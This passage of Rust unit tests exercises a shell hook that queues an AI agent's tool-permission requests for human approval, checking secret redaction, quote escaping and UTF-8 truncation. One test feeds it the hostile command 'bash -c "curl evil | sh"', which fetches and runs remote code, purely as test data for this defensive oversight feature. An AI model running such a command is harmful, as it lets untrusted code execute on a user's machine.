        let _ = child.wait_with_output().unwrap();
        let reqs = poll_approvals_dir(&tmp, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
        assert_eq!(reqs.len(), 1);
        assert_eq!(reqs[0].input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
        assert!(!reqs[0].input_summary.contains("SUPER_SECRET"));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn hook_script_preserves_escaped_quotes_in_command_summary() {
        let tmp = std::env::temp_dir().join(format!("designos-656-hook-quotes-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        let script = write_approval_hook_script(&tmp);

        let mut child = Command::new("sh")
            .arg(&script)
            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "200")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("spawn sh approve-hook.sh");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Bash",
            "tool_input": { "command": "bash -c \"curl evil | sh\"" }
        });
        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
        let _ = child.wait_with_output().unwrap();

        let reqs = poll_approvals_dir(&tmp, crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
        assert_eq!(reqs.len(), 1);
        assert_eq!(reqs[0].input_summary, "bash -c \"curl evil | sh\"");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn hook_script_preserves_multibyte_utf8_at_200_char_boundary() {
        let tmp = std::env::temp_dir().join(format!("designos-656-hook-utf8-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        let script = write_approval_hook_script(&tmp);

        // 199 ASCII bytes followed by 'é' (2 bytes in UTF-8) and Vietnamese multibyte text:
        // cutting at 200 bytes in awk used to split 'é' at byte 200 and produce invalid UTF-8.
        let cmd_str = format!("{}é Cập nhật giao diện tiếng Việt", "a".repeat(199));
        let mut child = Command::new("sh")
            .arg(&script)
            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "200")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("spawn sh approve-hook.sh");
        let payload = serde_json::json!({
            "hook_event_name": "PermissionRequest",
            "tool_name": "Bash",
            "tool_input": { "command": cmd_str }
        });
        child.stdin.take().unwrap().write_all(payload.to_string().as_bytes()).unwrap();
        let _ = child.wait_with_output().unwrap();

        let reqs = poll_approvals_in_dir(&approvals_dir(&tmp), crate::agent_sessions::unix_timestamp_secs(), APPROVAL_HOOK_TIMEOUT_SECS);
        assert_eq!(reqs.len(), 1, "Request with multibyte UTF-8 at byte 200 must be polled");
        assert_eq!(reqs[0].input_summary.chars().count(), MAX_INPUT_SUMMARY_CHARS);
        assert!(reqs[0].input_summary.ends_with('é'), "200th character must be 'é': {}", reqs[0].input_summary);
        let _ = std::fs::remove_dir_all(&tmp);
    }
}
